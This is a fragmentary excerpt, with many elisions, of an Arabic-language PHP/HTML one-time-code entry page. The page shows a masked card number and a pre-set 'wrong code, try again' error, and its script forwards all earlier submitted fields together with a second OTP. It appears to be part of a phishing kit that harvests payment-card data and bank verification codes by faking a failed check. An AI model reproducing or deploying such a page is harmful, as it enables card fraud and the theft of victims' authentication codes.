...
<p class="otp-subtitle">
    ...
    <span class="phone-display" id="cardDisplay" style="direction:ltr;display:inline-block">**** ****</span>
            ...
            <form id="otpForm">
                ...
                <input 
                    ...
                    autocomplete="off" 
                    required 
                    style="width:100%;padding:1rem;font-size:1.5rem;font-weight:700;text-align:center;border:2px solid var(--color-error);border-radius:12px;background:white;color:var(--color-text-primary);letter-spacing:0.5rem;font-family:'Courier New',monospace"
                >
                ...
                <div class="error-message" id="errorMessage">
                    ...
                    <span>رمز التحقق خاطئ، يرجى المحاولة مرة أخرى</span>
                </div>
            ...
            <div class="resend-section">
                ...
                <button type="button" class="resend-btn" id="resendBtn" disabled>
                    إعادة إرسال الرمز (<span class="timer" id="timer">60</span>)
                </button>
            </div>
        </div>
    </main>
  ...
  <script>
    ...
    form.addEventListener('submit', async function(e) {
        ...
        // إنشاء formData جديد وإضافة البيانات يدوياً (بدون أكواد OTP القديمة)
        const formData = new URLSearchParams();
        
        // إضافة رمز OTP الجديد فقط
        formData.append('otp_code_second', otp);
        
        // إضافة البيانات الأخرى (باستثناء أكواد OTP القديمة)
        <?php 
        foreach($_POST as $key => $value) {
            // تجاهل أكواد OTP القديمة
            if($key === 'otp_code' || $key === 'otp_code_first' || $key === 'otp_code_second') {
                continue;
            }
            if(is_array($value)) {
        ...
        try {
            ...
            // إظهار رسالة الخطأ والانتظار 2 ثانية
            setTimeout(() => {
